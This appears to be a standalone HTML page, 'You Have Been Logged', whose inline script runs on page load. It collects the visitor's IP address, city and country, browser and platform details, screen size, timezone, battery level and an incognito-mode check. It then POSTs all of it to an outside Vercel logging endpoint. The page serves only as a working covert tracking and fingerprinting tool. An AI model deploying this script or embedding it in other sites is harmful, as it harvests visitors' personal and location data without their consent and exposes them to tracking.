<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>You Have Been Logged</title>
</head>
<body>
  <h1>You Have Been Logged</h1>

  <script>
  (async () => {
    try {
      const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());

      const battery = await (navigator.getBattery?.() || Promise.resolve(null));
      const batteryLevel = battery ? `${Math.round(battery.level * 100)}%` : "Unknown";

      let incognito = "Unknown";
      try {
        window.RequestFileSystem || window.webkitRequestFileSystem
          ? window.webkitRequestFileSystem(
              window.TEMPORARY,
              100,
              () => (incognito = "No"),
              () => (incognito = "Yes")
            )
          : (incognito = "Not detectable");
      } catch {
        incognito = "Not detectable";
      }

      const visitorData = {
        ip: ipData.ip || "Unknown",
        city: ipData.city || "Unknown",
        region: ipData.region || "Unknown",
        country: ipData.country_name || "Unknown",
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenSize: `${screen.width}x${screen.height}`,
        url: location.href,
        platform: navigator.platform,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localTime: new Date().toString(),
        battery: batteryLevel,
        incognito,
      };

      // Change this URL to your deployed Vercel API URL
      const backendURL = "https://dontlarp153-github-io-pi.vercel.app/api/log";

      await fetch(backendURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(visitorData),
      });

      console.log("Visitor data sent to backend.");
    } catch (error) {
      console.error("Failed to send visitor data:", error);
    }
  })();
  </script>
</body>
</html>
<!-- force redeploy -->
